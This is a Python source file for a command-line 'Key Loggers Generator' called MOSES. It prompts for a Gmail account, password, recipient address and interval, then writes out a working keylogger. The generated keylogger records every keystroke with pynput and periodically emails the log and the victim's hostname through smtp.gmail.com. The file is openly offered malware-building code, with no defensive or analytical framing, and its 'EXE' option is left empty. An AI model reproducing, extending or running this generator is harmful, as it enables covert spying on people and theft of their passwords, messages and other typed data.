from colorama import Style, Fore, Back
import os
import subprocess
import signal
import sys

print(Fore.CYAN + "   ▄▄▄▄███▄▄▄▄    ▄██████▄     ▄████████    ▄████████    ▄████████ ")
print(Fore.CYAN + " ▄██▀▀▀███▀▀▀██▄ ███    ███   ███    ███   ███    ███   ███    ███ ")
print(Fore.CYAN + " ███   ███   ███ ███    ███   ███    █▀    ███    █▀    ███    █▀  ")
print(
    Fore.CYAN + " ███   ███   ███ ███    ███   ███         ▄███▄▄▄       ███        " + Style.BRIGHT + "Welcome to MOSES :: Key Loggers Generator")
print(
    Fore.CYAN + " ███   ███   ███ ███    ███ ▀███████████ ▀▀███▀▀▀     ▀███████████ " + Style.BRIGHT + "  Use 'help' to see all the commands")
print(Fore.CYAN + " ███   ███   ███ ███    ███          ███   ███    █▄           ███ ")
print(Fore.CYAN + " ███   ███   ███ ███    ███    ▄█    ███   ███    ███    ▄█    ███ ")
print(Fore.CYAN + "  ▀█   ███   █▀   ▀██████▀   ▄████████▀    ██████████  ▄████████▀  ")
print(Fore.CYAN + "")
print(Fore.CYAN + "")
print(Fore.CYAN + "")

print(Style.RESET_ALL)



def signal_handler(signal, frame):
  sys.exit(0)

signal.signal(signal.SIGINT, signal_handler)

for i in range(3):
    print("")

while True:

    Selection = input(Fore.CYAN + "NRD >")

    if Selection.__contains__("help"):
        print("")

        print(Fore.RED + """
        1) PY Key Logger File
        2) EXE Key Logger File
        """ + Style.RESET_ALL)

        print()

    if Selection == "1":
        print()

        path = input(Fore.YELLOW + "What path do you want the text file to be at: " + Fore.CYAN)
        Style.RESET_ALL
        NameOfKeyLogger = input(
            Fore.YELLOW + "Enter the " + Style.BRIGHT + "Key Logger name" + Style.RESET_ALL + "  : " + Fore.CYAN)
        Style.RESET_ALL
        Email = input(Fore.YELLOW + "Enter your " + Style.BRIGHT + "EMAIL" + Style.RESET_ALL + ":" + Fore.CYAN)
        Style.RESET_ALL
        EmailPass = input(Fore.YELLOW + "Enter your " + Style.BRIGHT + "PASSWORD" + Style.RESET_ALL + ": " + Fore.CYAN)
        Style.RESET_ALL
        EmailTarget = input(Fore.YELLOW + "Enter the email you want to send the logs: " + Fore.CYAN)
        Style.RESET_ALL
        SleepTime = input(Fore.YELLOW + "How much time to wait until sending new email (Seconds Format): " + Fore.CYAN)
        Style.RESET_ALL

        KeyLoggerCode = fr'''
from pynput.keyboard import Key
from pynput.keyboard import Listener
import logging
import time
import threading
import smtplib
from email.mime.text import MIMEText
from email.mime.image import MIMEImage
from email.mime.multipart import MIMEMultipart
import socket
server = smtplib.SMTP_SSL('smtp.gmail.com', 465)
server.login('{Email}','{EmailPass}')
log_dir = r"{path}"
logging.basicConfig(filename=(log_dir + ".txt"),
level=logging.DEBUG, format='%(asctime)s: %(message)s')

def setInterval(func,time):
     e = threading.Event()
     while not e.wait(time):
         func()
def SendEmail():
    LogToSend = open(r'{path}' + '.txt', 'rt').read()
    msg = MIMEMultipart()
    msg['Subject'] = 'KEYLOGGER Machine Name: ' + socket.gethostname()
    msg['From'] = '{Email}'
    msg['To'] = '{EmailTarget}'
    msg.attach(MIMEText(str(LogToSend)))
    attachment = MIMEText(LogToSend)
    attachment.add_header('Content-Disposition', 'attachment', filename="LOG FILE" + ".txt")
    msg.attach(attachment)
    server.sendmail('{Email}', '{EmailTarget}', msg.as_string())


def on_press(key):
    logging.info(str(key))


with Listener(on_press=on_press) as listener:
    setInterval(SendEmail, {SleepTime})
    listener.join()

'''

        f = open(F"{NameOfKeyLogger}.py", "w+")
        f.write(KeyLoggerCode)
        f.close()


        print()


    if Selection == "2":
        print("")
        

